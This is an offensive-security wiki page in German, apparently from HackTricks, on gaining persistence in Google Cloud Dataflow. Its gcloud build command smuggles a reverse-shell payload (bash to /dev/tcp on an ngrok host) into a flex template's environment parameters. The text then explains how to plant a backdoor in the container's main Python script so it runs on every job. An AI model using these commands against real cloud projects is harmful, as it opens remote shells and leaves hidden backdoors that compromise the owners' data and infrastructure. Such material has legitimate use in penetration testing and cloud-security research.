# GCP - Dataflow Persistenz

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

### Unsichtbare Persistenz im erstellten Container

Mit dem [**Tutorial aus der Dokumentation**](https://cloud.google.com/dataflow/docs/guides/templates/using-flex-templates) können Sie eine neue (z. B. python) flex template erstellen:

<details>

<summary>Create Dataflow flex template with backdoor</summary>
```bash
git clone https://github.com/GoogleCloudPlatform/python-docs-samples.git
cd python-docs-samples/dataflow/flex-templates/getting_started

# Create repository where dockerfiles and code is going to be stored
export REPOSITORY=flex-example-python
gcloud storage buckets create gs://$REPOSITORY

# Create artifact storage
export NAME_ARTIFACT=flex-example-python
gcloud artifacts repositories create $NAME_ARTIFACT \
--repository-format=docker \
--location=us-central1
gcloud auth configure-docker us-central1-docker.pkg.dev

# Create template
export NAME_TEMPLATE=flex-template
gcloud dataflow $NAME_TEMPLATE build gs://$REPOSITORY/getting_started-py.json \
--image-gcr-path "us-central1-docker.pkg.dev/gcp-labs-35jfenjy/$NAME_ARTIFACT/getting-started-python:latest" \
--sdk-language "PYTHON" \
--flex-template-base-image "PYTHON3" \
--metadata-file "metadata.json" \
--py-path "." \
--env "FLEX_TEMPLATE_PYTHON_PY_FILE=getting_started.py" \
--env "FLEX_TEMPLATE_PYTHON_REQUIREMENTS_FILE=requirements.txt" \
--env "PYTHONWARNINGS=all:0:antigravity.x:0:0" \
--env "/bin/bash -c 'bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/13355 0>&1' & #%s" \
--region=us-central1
```
</details>

**Während es gebaut wird, bekommst du eine reverse shell** (du könntest env variables wie im vorherigen Beispiel oder andere params missbrauchen, die die Docker file so setzen, dass sie beliebige Dinge ausführt). In diesem Moment, innerhalb der reverse shell, ist es möglich, **ins `/template`-Verzeichnis zu gehen und den Code des main python script zu ändern, das ausgeführt wird (in unserem Beispiel ist das `getting_started.py`)**. Platziere hier deine backdoor, damit sie bei jeder Ausführung des Jobs ausgeführt wird.

Dann wird beim nächsten Ausführen des Jobs der kompromittierte, erstellte Container gestartet:

<details>

<summary>Dataflow-Template ausführen</summary>
```bash
# Run template
gcloud dataflow $NAME_TEMPLATE run testing \
--template-file-gcs-location="gs://$NAME_ARTIFACT/getting_started-py.json" \
--parameters=output="gs://$REPOSITORY/out" \
--region=us-central1
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
